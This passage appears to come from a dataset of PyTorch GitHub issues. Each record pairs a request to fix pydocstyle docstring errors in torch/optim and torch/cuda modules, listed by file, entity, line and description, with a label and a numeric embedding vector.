- **File**: `torch/optim/adam.py`, **Entity**: `adam`, **Line**: 267, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/optim/adamax.py`, **Entity**: `step`, **Line**: 87, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adamax.py`, **Entity**: `adamax`, **Line**: 197, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/optim/adamw.py`, **Entity**: `step`, **Line**: 151, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/adamw.py`, **Entity**: `adamw`, **Line**: 302, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/optim/asgd.py`, **Entity**: `step`, **Line**: 98, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/optim/asgd.py`, **Entity**: `asgd`, **Line**: 181, **Description**: No blank lines allowed after function docstring (found 1)

cc @carljparker",False,"[-1.84190363e-01 -3.35766673e-01  9.13589299e-02 -2.50129163e-01
  2.77808905e-01  1.31126940e-01 -1.03494804e-02  2.83552110e-02
 -4.08468723e-01  1.35419056e-01 -4.68623377e-02  2.15254538e-02
 -3.57160419e-02  3.80753100e-01 -7.64484853e-02  1.36092156e-01
 -3.35827857e-01 -1.86187506e-01  1.76294386e-01  1.67917430e-01
  4.08029854e-01  2.94347852e-01 -1.41417131e-01  5.59568033e-02
 -2.45838761e-01  1.50953025e-01 -1.93920493e-01 -2.99149275e-01
  1.73458736e-02 -1.29099369e-01  3.62807184e-01  2.68517673e-01
  2.14139014e-01 -7.89668560e-02  3.82968783e-01  1.82218313e-01
 -8.07921737e-02 -2.93467522e-01 -3.15649398e-02  1.69667184e-01
 -8.86959210e-02  2.53173746e-02 -1.68126717e-01 -2.50878334e-02
 -1.15467384e-01 -2.66787142e-01 -9.43136290e-02  2.28524417e-01
 -9.52659026e-02  1.07436508e-01  7.67409243e-03 -3.89621146e-02
 -5.05308211e-01 -1.65245175e-01  8.97357017e-02  1.53060466e-01
 -1.33899301e-01  3.38828027e-01 -5.27689280e-03 -1.88330323e-01
  1.21936813e-01  7.40670711e-02 -9.24291611e-02  4.76381421e-01
  5.28932475e-02  4.01064277e-01 -5.51546030e-02  6.02561347e-02
  2.64157683e-01  4.27889898e-02 -2.01016217e-01  1.19451538e-01
 -3.16529512e-01 -9.14334357e-02  1.14547081e-01  1.37302309e-01
 -3.15468371e-01 -5.51724136e-02 -1.67000681e-01 -8.25220272e-02
 -2.30229437e-01 -1.78381786e-01  2.97388732e-02 -2.39171032e-02
 -1.88037753e-02 -1.66553587e-01  1.32225111e-01 -4.94260527e-02
  1.16643481e-01  1.13192305e-01  4.51288193e-01 -2.42348686e-01
 -7.16240928e-02  4.39390838e-01  3.33932102e-01  2.64114201e-01
 -1.24551639e-01 -2.88996041e-01  1.29042596e-01 -2.45196484e-02
 -1.13807470e-01 -1.88075155e-01 -4.15444225e-02  3.55852038e-01
 -1.75861880e-01 -4.58822548e-02 -5.81571497e-02 -1.63394392e-01
  3.44577491e-01  2.70987600e-01 -3.75564210e-02 -2.48216525e-01
  4.81785178e-01  1.42036438e-01  1.74524993e-01 -7.54383057e-02
 -1.92623690e-01 -5.24188019e-03 -3.26352209e-01  1.58120155e-01
  2.59125888e-01  6.31149933e-02  2.85405278e-01  2.74425209e-01
  1.49594873e-01  4.28445973e-02 -4.41534370e-02  3.30590643e-03
  9.47541296e-02 -2.91710347e-01  4.16661084e-01 -2.10869581e-01
 -5.24961539e-02  9.76823941e-02  6.40740544e-02 -1.48385745e-02
 -3.40467215e-01 -5.13985217e-01 -5.01732677e-02 -2.47540064e-02
 -3.56088817e-01 -1.74847230e-01 -2.66438544e-01 -9.76643637e-02
  2.64762223e-01  5.34355283e-01 -3.34662855e-01  5.59427977e-01
  3.85630503e-02 -1.24313354e-01 -1.59397900e-01  2.46544182e-01
 -4.04236674e-01  1.65358007e-01  1.68974157e-02  1.77303940e-01
  7.50972092e-01 -5.94096035e-02 -2.59381890e-01 -2.35347763e-01
 -8.11035335e-02  1.53788596e-01  1.31828785e-01 -2.69142151e-01
 -1.13724612e-01  8.44979435e-02 -2.14412808e-01 -1.23027250e-01
 -1.23535633e-01 -5.70239648e-02  3.74550134e-01  2.12659240e-01
  2.10597217e-02 -6.44088462e-02  4.13253814e-01  7.72143975e-02
 -2.57876754e-01 -3.65503907e-01 -3.77514735e-02  3.91500950e-01
 -1.69919163e-01  1.84026450e-01  1.00989744e-01 -6.94504799e-03
 -2.32701123e-01  8.23956877e-02  8.84649605e-02  1.23716705e-02
  1.13130882e-01  3.11668217e-01  1.75561503e-01 -4.04101700e-01
  1.10989019e-01 -6.34022728e-02 -2.25735500e-01 -1.32618740e-01
  4.88935024e-01  6.11077189e-01 -4.69143093e-02  2.77096152e-01
 -1.53089404e-01  2.69208938e-01  2.07800895e-01 -6.26576841e-02
  5.01652002e-01  3.72914458e-03 -6.75481185e-02 -2.47391239e-01
 -3.82948101e-01  1.49033517e-01 -3.02332580e-01 -2.80232251e-01
 -1.27625600e-01 -4.02632564e-01 -4.52790737e-01  5.27423382e-01
  2.74006873e-01 -2.04617769e-01  2.77641892e-01 -2.32078716e-01
 -4.37410384e-01 -6.06089532e-02 -3.34132433e-01 -2.37289786e-01
  1.35883167e-01 -1.04445308e-01 -2.01185018e-01  8.56426060e-02
 -2.87566543e-01  1.27312541e-01  5.78948557e-02  1.86188206e-01
  9.94767129e-01 -2.73064494e-01  4.19430256e-01  2.09985033e-01
  2.35737264e-02 -7.76555836e-02  2.49672785e-01  1.16058350e-01
 -3.88484672e-02  5.73779009e-02 -2.30195746e-02  3.96924391e-02
  2.07684636e-01 -2.38441944e-01 -3.72262597e-01 -3.08055073e-01
 -2.95744002e-01  2.40089104e-01 -3.55870217e-01 -2.61122525e-01
  1.87819481e-01  2.15828419e-04  4.74492013e-01  1.35765970e-01
 -7.48085916e-01 -2.14344531e-01 -7.08596548e-04  1.87991738e-01
 -1.39025319e-03  8.08320642e-02 -1.51613757e-01  2.88200438e-01
  3.95566881e-01  8.83982778e-02 -3.44422519e-01 -1.05703413e-01
  3.55878174e-01 -3.66258591e-01  2.26497129e-01 -6.49160147e-01
  4.31757540e-01  1.24063082e-01  1.59754947e-01  2.24665612e-01
  3.22144866e-01 -2.32999593e-01 -9.56307054e-02 -1.44493297e-01
 -2.71419525e-01  3.09915781e-01 -3.50308895e-01 -2.07489952e-02
  2.41302833e-01 -4.56781918e-03 -1.78835317e-02 -3.47438633e-01
 -5.75375915e-01 -2.71455377e-01 -1.37003541e-01  9.82547402e-02
  3.40449214e-01  1.08444020e-01  1.82961114e-03  8.97626281e-02
 -2.17757449e-02  2.80697346e-01  2.15623647e-01 -1.10142604e-01
 -4.63239938e-01  1.19621769e-01 -3.60417701e-02  1.46368831e-01
  6.97884262e-02  2.29464293e-01  2.10199714e-01  1.68623224e-01
  1.24214485e-01 -4.63461965e-01  3.68032873e-01  2.49445140e-01
 -1.70861036e-01  3.39374304e-01 -7.01661594e-03 -5.18508665e-02
  5.24493158e-02  5.11185169e-01  1.41928107e-01  4.09462750e-02
 -1.08504415e-01 -4.05422091e-01 -2.96166897e-01  6.13594986e-02
  2.53046095e-01 -1.58360109e-01 -3.19919735e-01 -7.24779814e-02
 -2.65721053e-01 -4.91451949e-01  1.71994507e-01  1.34631589e-01
 -1.08280182e-01  8.54818597e-02  2.06790075e-01  9.11204815e-02
 -3.35241407e-01  3.89981329e-01 -2.31906027e-02 -3.28372270e-01
 -1.08973712e-01 -4.11969498e-02  1.44909650e-01 -4.27613080e-01
 -7.41502121e-02 -8.96102786e-02  3.75102341e-01  1.99977815e-01
 -3.86946559e-01 -1.67626664e-01  3.38686466e-01  8.57870728e-02
 -2.23054364e-01 -1.46953151e-01 -3.07152737e-02  3.10865760e-01
  1.67012066e-01  2.42827982e-01 -1.70229077e-01  3.80961269e-01
 -4.01471257e-01 -1.95149019e-01 -2.79517472e-01 -4.29830611e-01
 -1.23772956e-02 -1.69867724e-01 -5.81634827e-02 -1.03028819e-01
  7.52410963e-02 -9.42414105e-02 -1.51968747e-01  2.39029139e-01
 -4.02424395e-01  2.36289889e-01  2.52056479e-01  1.22087389e-01
  2.04010382e-01 -1.04265511e-02  6.16641250e-03 -2.31557071e-01
 -5.62878609e-01  3.90250146e-01  4.54549015e-01 -2.87777662e-01]"
"Fix docstring errors in __init__.py, _memory_viz.py, streams.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/cuda/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_is_compiled`, **Line**: 107, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `is_available`, **Line**: 114, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `is_bf16_supported`, **Line**: 130, **Description**: First line should end with a period (not '6')
- **File**: `torch/cuda/__init__.py`, **Entity**: `is_bf16_supported`, **Line**: 130, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `is_initialized`, **Line**: 196, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `init`, **Line**: 226, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `init`, **Line**: 226, **Description**: First line should end with a period (not 'l')
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_device`, **Line**: 358, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_device_name`, **Line**: 373, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_device_capability`, **Line**: 388, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_device_properties`, **Line**: 405, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `can_device_access_peer`, **Line**: 421, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/cuda/__init__.py`, **Entity**: `can_device_access_peer`, **Line**: 421, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/cuda/__init__.py`, **Entity**: `StreamContext`, **Line**: 434, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `stream`, **Line**: 485, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `stream`, **Line**: 485, **Description**: First line should end with a period (not 't')
- **File**: `torch/cuda/__init__.py`, **Entity**: `stream`, **Line**: 485, **Description**: First line should be in imperative mood; try rephrasing (found 'Wrapper')
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_stream`, **Line**: 497, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_stream`, **Line**: 497, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_strtoul`, **Line**: 517, **Description**: First line should end with a period (not ',')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_count_nvml`, **Line**: 559, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_count_nvml`, **Line**: 559, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_count_nvml`, **Line**: 559, **Description**: First line should end with a period (not 'L')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_uuid_nvml`, **Line**: 577, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_uuid_nvml`, **Line**: 577, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/__init__.py`, **Entity**: `_raw_device_uuid_nvml`, **Line**: 577, **Description**: First line should end with a period (not 'L')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_transform_uuid_to_ordinals`, **Line**: 609, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_transform_uuid_to_ordinals`, **Line**: 609, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/__init__.py`, **Entity**: `_transform_uuid_to_ordinals`, **Line**: 609, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_device_count_nvml`, **Line**: 636, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_device_count_nvml`, **Line**: 636, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/__init__.py`, **Entity**: `_get_nvml_device_index`, **Line**: 665, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `device_count`, **Line**: 680, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_arch_list`, **Line**: 687, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_gencode_flags`, **Line**: 696, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `current_device`, **Line**: 706, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `synchronize`, **Line**: 712, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **File**: `torch/cuda/__init__.py`, **Entity**: `current_stream`, **Line**: 738, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `default_stream`, **Line**: 753, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `current_blas_handle`, **Line**: 768, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/__init__.py`, **Entity**: `current_blas_handle`, **Line**: 768, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_sync_debug_mode`, **Line**: 773, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/__init__.py`, **Entity**: `set_sync_debug_mode`, **Line**: 773, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_sync_debug_mode`, **Line**: 798, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/__init__.py`, **Entity**: `get_sync_debug_mode`, **Line**: 798, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `memory_usage`, **Line**: 818, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `memory_usage`, **Line**: 818, **Description**: First line should end with a period (not ')')
- **File**: `torch/cuda/__init__.py`, **Entity**: `memory_usage`, **Line**: 818, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `utilization`, **Line**: 837, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/__init__.py`, **Entity**: `utilization`, **Line**: 837, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `utilization`, **Line**: 837, **Description**: First line should end with a period (not 'r')
- **File**: `torch/cuda/__init__.py`, **Entity**: `utilization`, **Line**: 837, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `temperature`, **Line**: 855, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `temperature`, **Line**: 855, **Description**: First line should end with a period (not ')')
- **File**: `torch/cuda/__init__.py`, **Entity**: `temperature`, **Line**: 855, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `power_draw`, **Line**: 871, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/__init__.py`, **Entity**: `power_draw`, **Line**: 871, **Description**: First line should end with a period (not ')')
- **File**: `torch/cuda/__init__.py`, **Entity**: `power_draw`, **Line**: 871, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `clock_rate`, **Line**: 886, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_get_generator`, **Line**: 916, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_set_rng_state_offset`, **Line**: 929, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_get_rng_state_offset`, **Line**: 945, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/__init__.py`, **Entity**: `_WrappedTritonKernel`, **Line**: 1144, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_WrappedTritonKernel`, **Line**: 1144, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/cuda/streams.py`, **Entity**: `wait_event`, **Line**: 38, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/cuda/streams.py`, **Entity**: `wait_stream`, **Line**: 55, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')
- **File**: `torch/cuda/streams.py`, **Entity**: `record_event`, **Line**: 69, **Description**: First line should be in imperative mood (perhaps 'Record', not 'Records')
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 84, **Description**: Docstring is over-indented
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 84, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 84, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 84, **Description**: Section has no content ('Returns')
- **File**: `torch/cuda/streams.py`, **Entity**: `record`, **Line**: 172, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/streams.py`, **Entity**: `record`, **Line**: 172, **Description**: First line should be in imperative mood (perhaps 'Record', not 'Records')
- **File**: `torch/cuda/streams.py`, **Entity**: `wait`, **Line**: 181, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/streams.py`, **Entity**: `wait`, **Line**: 181, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/streams.py`, **Entity**: `wait`, **Line**: 181, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 194, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/cuda/streams.py`, **Entity**: `elapsed_time`, **Line**: 203, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/streams.py`, **Entity**: `elapsed_time`, **Line**: 203, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/streams.py`, **Entity**: `elapsed_time`, **Line**: 203, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/streams.py`, **Entity**: `synchronize`, **Line**: 209, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **File**: `torch/cuda/streams.py`, **Entity**: `ipc_handle`, **Line**: 220, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/streams.py`, **Entity**: `ipc_handle`, **Line**: 220, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/streams.py`, **Entity**: `ipc_handle`, **Line**: 220, **Description**: First line should end with a period (not 't')
- **File**: `torch/cuda/streams.py`, **Entity**: `ipc_handle`, **Line**: 220, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/_memory_viz.py`, **Entity**: `segsum`, **Line**: 196, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/_memory_viz.py`, **Entity**: `segsum`, **Line**: 196, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/cuda/_memory_viz.py`, **Entity**: `segsum`, **Line**: 196, **Description**: First line should end with a period (not 's')

cc @carljparker",False,"[-0.1027402  -0.1812402  -0.03694456 -0.06398217  0.18430662 -0.12665656
 -0.12555076  0.14216582 -0.38968804  0.15639122 -0.0138884  -0.03141893
  0.13184416  0.15052104 -0.12424804  0.05068794 -0.3533698  -0.40729302
  0.2178956   0.06936989  0.17202884  0.4236537  -0.17393868  0.01346712
 -0.02962589  0.1542817  -0.43815267 -0.1936296   0.02188906  0.09330562
  0.30300987  0.07227375 -0.32296342  0.04228836  0.4410122   0.2803473
 -0.25287616 -0.12952144  0.0123543   0.1192288   0.03502412 -0.265858
 -0.17200229  0.03721561  0.10153656 -0.23165491 -0.27923983  0.16525704
  0.00357205  0.12925632 -0.11882319  0.10894617 -0.18751389  0.09226511
  0.18427214 -0.07143322 -0.15946034  0.5665681   0.10212937 -0.01244345
  0.16997638  0.19002591 -0.12469579  0.04870135 -0.1825133   0.2468352
 -0.05181212  0.32200032  0.3196559   0.11521186 -0.16374138  0.14192289
 -0.33422816 -0.2798588   0.00796899  0.30910265 -0.4424306   0.0299718
 -0.3843205  -0.34085608 -0.13504018  0.13809615 -0.01250784  0.13617638
  0.03362046 -0.05062424  0.28986222 -0.18622959  0.4274655   0.03383616
  0.38875112 -0.11515604 -0.04698994  0.3923575   0.13867523  0.2224267
 -0.05353419 -0.09466477 -0.00557284 -0.20026968  0.13049522 -0.32018292
 -0.11304212  0.17663488  0.04373703 -0.04003814  0.17101975  0.05200723
  0.22486082 -0.04836171  0.21885094 -0.11432812 -0.04101728  0.11249147
  0.3163672   0.15155587 -0.16078877 -0.09119155 -0.31531614  0.09963883
  0.18474908  0.21072716 -0.0412472   0.08783963  0.06811254 -0.00682564
  0.39114714 -0.03253302 -0.03347516 -0.1917117   0.11967034  0.02741559
 -0.15206808  0.07930154  0.27163154  0.21085994 -0.10216497 -0.23840575
 -0.0272585  -0.07338487 -0.2963242  -0.25262755 -0.28266194 -0.32930166
  0.2798198   0.26624423 -0.4057483   0.27683473  0.01238931  0.13691217
 -0.10861647 -0.06000753 -0.3518304   0.5225344  -0.017405    0.00767305
  0.45560676  0.13231534  0.05143263 -0.3744134   0.00723928  0.1821369
 -0.02249416  0.06233706 -0.13066441  0.12545991 -0.18386191 -0.11971631
 -0.41095722 -0.13456564 -0.01570564  0.10967984 -0.02866795 -0.05649958
  0.17219025  0.0443658  -0.03294094 -0.31232396 -0.00340137  0.31128633
  0.08313012  0.5802578   0.14851029  0.03753649 -0.2276493   0.15540737
  0.1656524  -0.19506301  0.22039852  0.29337454 -0.04456011 -0.2312331
  0.11993396  0.03844679 -0.08175297  0.08685078  0.23732916  0.43207312
 -0.07023649  0.261504   -0.3275541   0.19166072  0.31390142 -0.12223294
  0.48307985 -0.06117722 -0.45826143 -0.28737405 -0.17849018 -0.02827073
 -0.33042836 -0.18237153  0.03227676 -0.30619928 -0.17665842  0.34239808
 -0.04737522 -0.2943347   0.35150212 -0.00925818 -0.28499702 -0.02229929
 -0.11395226 -0.31674412  0.35449833  0.15459558  0.00975538 -0.15814063
 -0.0116207  -0.00465167  0.02956808 -0.05397908  0.49026838 -0.15864673
  0.10122104  0.21683389 -0.16271845 -0.0642345   0.14275046  0.26437405
 -0.11821645 -0.0975367  -0.0293698  -0.01832351  0.1540375  -0.10356385
 -0.15838456  0.03747616 -0.31354573  0.15914622  0.03068326 -0.34585232
  0.01895871 -0.10925891  0.6360053   0.07363798 -0.26578918  0.0296046
 -0.03087325  0.03541482  0.01410666  0.33655322 -0.15393092  0.15816978
  0.29190096 -0.22168863 -0.2137768   0.18877804 -0.22985709 -0.09430787
  0.23700187 -0.52996093  0.35595232  0.20632982  0.39997196 -0.03911627
  0.33838943 -0.09031931  0.19653645 -0.05857447 -0.08515216  0.4215471
 -0.39513135 -0.03039179  0.29297173 -0.10796778 -0.22397897 -0.2903378
 -0.5216136  -0.18006523 -0.25488135  0.189729    0.32776147 -0.0112095
  0.00566968  0.15251833 -0.09679374  0.07342662  0.19851694  0.12067077
 -0.45437256 -0.12942019 -0.14156276  0.18626843 -0.07522313  0.27307448
  0.034362    0.04864952  0.21342376 -0.3025569   0.32465     0.29745603
 -0.30319303  0.24774534 -0.0610076   0.08323972 -0.0415745   0.38988316
  0.05528741  0.02887122 -0.01946328 -0.39973968 -0.18855324  0.07217834
  0.04019023 -0.10486776 -0.553191    0.2239899  -0.27923203 -0.25155562
  0.2737813   0.03977051 -0.05262475 -0.16442856 -0.07744811 -0.09986509
 -0.1221161   0.15190585  0.00301314 -0.38999808 -0.0106212  -0.20108484
  0.02938444 -0.5251023  -0.04533466 -0.07079338  0.30022278  0.32829684
 -0.3938293  -0.33281767  0.5514093  -0.04228646 -0.36678544  0.14503026
 -0.15266982  0.5035461   0.01604563  0.26495284 -0.10275315  0.34160224
 -0.47455716  0.03065613 -0.1190149  -0.26445174 -0.12915802 -0.27699396
 -0.07908343  0.03536756  0.26627353 -0.15840372 -0.37545577  0.10329255
 -0.13997068  0.3075744   0.41506737  0.08688831  0.1253453  -0.09104343
  0.0355675  -0.23916478 -0.31759733  0.32723707  0.28899908 -0.11782397]"
"Fix docstring errors in memory.py, nvtx.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/cuda/memory.py`, **Entity**: `caching_allocator_alloc`, **Line**: 48, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/cuda/memory.py`, **Entity**: `caching_allocator_delete`, **Line**: 82, **Description**: First line should be in imperative mood (perhaps 'Delete', not 'Deletes')
- **File**: `torch/cuda/memory.py`, **Entity**: `set_per_process_memory_fraction`, **Line**: 99, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `empty_cache`, **Line**: 126, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `empty_cache`, **Line**: 126, **Description**: First line should end with a period (not 'g')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_stats`, **Line**: 141, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_stats`, **Line**: 141, **Description**: First line should end with a period (not 'a')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_stats`, **Line**: 141, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_stats_as_nested_dict`, **Line**: 242, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_accumulated_memory_stats`, **Line**: 250, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_peak_memory_stats`, **Line**: 270, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_allocated`, **Line**: 289, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_allocated`, **Line**: 289, **Description**: First line should end with a period (not 'y')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_allocated`, **Line**: 289, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_cached`, **Line**: 315, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_cached`, **Line**: 315, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_cached`, **Line**: 315, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_allocated`, **Line**: 341, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_allocated`, **Line**: 341, **Description**: First line should end with a period (not 'n')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_allocated`, **Line**: 341, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_allocated`, **Line**: 359, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_allocated`, **Line**: 359, **Description**: First line should end with a period (not 'n')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_allocated`, **Line**: 359, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
